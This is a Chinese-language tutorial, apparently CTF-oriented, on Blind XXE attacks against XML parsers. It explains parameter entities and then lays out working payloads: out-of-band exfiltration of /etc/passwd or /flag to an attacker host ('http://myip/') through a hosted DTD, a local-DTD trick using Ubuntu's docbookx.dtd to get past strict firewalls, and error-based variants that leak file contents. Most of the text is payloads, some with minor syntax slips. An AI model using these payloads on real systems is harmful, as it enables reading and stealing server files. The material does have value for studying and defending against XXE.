# Blind XXE
## 参数实体
XML的DTD实体可以定义普通实体和参数实体两种类型，而这两种类型可以再分别为内部实体和外部实体。XXE就全称为XML外部实体注入。通过外部实体SYSTEM请求本地文件uri,通过某种方式返回本地文件内容就导致了XXE漏洞
声明内部实体和外部实体区别如下
```
<!ENTITY 实体名 SYSTEM url> //外部实体
<!ENTITY 实体名 实体的值> //内部实体
```
Blind XXE需要使用到DTD约束自定义实体中的参数实体。参数实体是只能在DTD中定义何使用的实体,以%为标志定义
定义和使用方法如下
```xml
<?xml version="1.0"?>
<!DOCTYPE message[
<!ENTITY normal "hello"> <!--内部普通实体-->
<!ENTITY normal SYSTEM "http://xml.org/hhh.dtd"> <!--外部普通实体-->
<!ENTITY % para SYSTEM 'file:///1234.dtd'> <!--外部参数实体-->
%para;  <!--引用参数实体-->
]>
<message>&normal;</message>
```
而且参数实体还能嵌套,需要注意的是,内层定义的参数实体%需要进行HTML转义,否则会出现解析错误
```xml
<?xml version="1.0"?>
<!DOCTYPE test[
<!ENTITY % outside '<!ENTITY &#x25;files SYSTEM "file:///etc/passwd">'>
]>
<message>&normal;</message>
```
# Blind XXE
## OOB

### 引入服务器DTD文件
既然外部实体可以通过请求内部文件uri获得内部文件内容,那么这样的话我们是不是可以写两个外部参数实体,第一个用file协议请求本地文件并将内容保存在参数实体中,第二个用http或者ftp协议请求服务器并带上文件内容
```xml
<?xml version="1.0"?>
<!DOCTYPE message[
    <!ENTITY % files SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://myip/?a=%files;">
    %send;
]>
```
这样可以吗,《XML Schema,DTD,and Entity Attacks》第10页明确表示了不行,几乎所有XML解析器都不会解析同级参数实体的内容
但是在上面我们也展示了参数实体可以嵌套定义,当两个参数实体不是同一级时,我们尝试调用一下
```xml
<?xml version="1.0"?>
<!DOCTYPE message[
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start '<!ENTITY &#x25;send SYSTEM 'http://myip/?%file;'>'>
%start;
%send;
]>
```
如上 我们先调用了start参数实体,生成了send参数实体声明。在send参数实体声明中,调用了files参数实体并请求了相关链接
测试发现错误PEReferences forbidden in internal subset in Entity PEReferences指的是参数实体引用(Parameter Entity Reference) 
禁止在内部Entity中引用实体参数
也就是因为这个限制 前人就想到 既然内部不行就引用外部的DTD
先在自己的服务器中加入以下DTD文件(xml.dtd)
```xml
<!ENTITY %start "<!ENTITY &#x25;send SYSTEM 'http://myip:10001/?%file;'>">
%start;
```
然后请求的数据为下面(用php协议将发送的数据编码为base64)
```
<?xml version="1.0"?>
<!DOCTYPE message[
<!ENTITY % remote SYSTEM "http://myip/xml.dtd"> 
%remote;
%send;
]>
<message>1234</message>
```
即可成功读到文件

### 引用本地DTD文件
如果目标主机的防火墙十分严格,不允许我们请求外网服务器dtd呢?由于xml的广泛使用,其实在各个系统中已经存在了部分DTD文件。按照上面的理论,我们只要从外部引入DTD文件,并在其中定义一些实体内容就行
我们就先来看看ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd部分内容
![](/images/1/84/1.png)
它定义了很多参数实体并调用了它。那么我们可以在内部重写一个dtd文件中含有的参数实体,而此时调用在外部,依然可以实现
```xml
<?xml version="1.0">
<!DOCTYPE message[
<!ENTITY % remote SYSTEM 'usr/share/yelp/dtd/docbookx.dtd'>
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=file:///flag'>
<!ENTITY % ISOamso '
<!ENTITY &#x25;eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;send;
'>
%remote;
]>
<message>1234</message>
```
其中 这里已经是三层参数实体嵌套了,第二层嵌套时我们只需要给定义参数实体的%编码,第三层就需要在第二层的基础上将所有% & ' "html编码
第一个调用的参数实体是%remote 在/usr/share/yelp/dtd/docbookx.dtd文件中调用了%ISOamso;
在ISOamso定义的实体中相继调用了eval和send 这里不直接使用两层嵌套的原因是如果直接使用两层嵌套仍然会报PEReferences forbidden in ternal subset inEntity错误

## 基于报错的Blind XXE
基于报错的原理和OOB类似,OOB通过构造一个带外的url将数据带出,而基于报错是构造一个错误的url并将泄露文件内容放在url中,通过这样的方式返回数据
所以和OOB构造方式几乎只有url出不同,其他地方一模一样

### 通过引入服务器文件
xml.dtd
```xml
<!ENTITY % start "<!ENTITY &#x25;send SYSTEM 'file:///hhhhhhhhhh/%file;'>">
%start;
```

```xml
<?xml version="1.0"?>
<!DOCTYPE message[
    <!ENTITY % remote SYSTEM 'http://xxxxxx/xml.dtd'>
    <!ENTITY % file SYSTEM 'file:///etc/passwd'>
    %remote;
    %send;
]>
<message>1234</message>
```

### 通过引入本地文件
```xml
<?xml version="1.0"?>
<!DOCTYPE message[
    <!ENTITY % remote SYSTEM 'usr/share/yelp/dtd/docbookx.dtd'>
    <!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=file:///etc/passwd'>
    <!ENTITY % ISOamso '
    <!ENTITY &#x25;eval "<!ENTITY &#x26;#x25;send SYSTEM &#x27;file://hhhhhhh/?&#x25;file&#x27;>">
    &#x25;eval
    &#x25;send
    '> 
    %remote;
]>
<message>1234</message>
```